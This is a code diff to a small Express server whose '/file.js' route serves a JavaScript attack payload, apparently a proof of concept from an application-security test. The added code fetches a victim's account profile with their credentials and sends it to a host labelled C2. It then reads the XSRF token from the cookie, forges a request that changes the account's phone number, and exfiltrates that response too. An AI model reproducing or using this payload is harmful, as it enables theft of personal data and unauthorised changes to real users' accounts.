@@ -35,17 +35,38 @@ app.post("/testpay", (_req, res) => {
 app.get("/file.js", (_req, res) => {
   res.type("application/javascript").send(`
   var C2 = 'https://appsec-test-website.onrender.com/testpay';
-  var x = new XMLHttpRequest();
-  x.open('GET', '/sgw3/secureapp/N600/Proxy/AccountOpenAPI/v1/Client/profile', false);
-  x.withCredentials = true;
-  x.send();
+  var g = new XMLHttpRequest();
+  g.open('GET', '/sgw3/secureapp/N600/Proxy/AccountOpenAPI/v1/Client/profile', false);
+  g.withCredentials = true;
+  g.send();
+
+  var diProfile = g.responseText;
   
-  var profile = x.responseText;
+  var e2 = new XMLHttpRequest();
+  e2.open('POST', C2, true);
+  e2.setRequestHeader('Content-Type', 'application/json');
+  e2.send(diProfile);
   
-  var e = new XMLHttpRequest();
-  e.open('POST', C2, true);
-  e.setRequestHeader('Content-Type', 'application/json');
-  e.send(profile);
+  var xsrf = decodeURIComponent(document.cookie.match(/DI-XSRF-TOKEN=([^;]+)/)[1]);
+  
+  var p = new XMLHttpRequest();
+  p.open('POST', '/sgw3/secureapp/N600/Proxy/profileapi/v1/profile', false);
+  p.withCredentials = true;
+  p.setRequestHeader('Content-Type', 'application/json');
+  p.setRequestHeader('X-Xsrf-Token', xsrf);
+  p.setRequestHeader('Language', 'en');
+  p.setRequestHeader('Locale', 'English');
+  p.send(JSON.stringify({
+    busPhone: '(647) 923-5551',
+    tcpInfo: null,
+    disclosure_1: true
+  }));
+  
+  // Exfil POST response
+  var e3 = new XMLHttpRequest();
+  e3.open('POST', C2, true);
+  e3.setRequestHeader('Content-Type', 'application/json');
+  e3.send(p.responseText);
   `);
 });
 
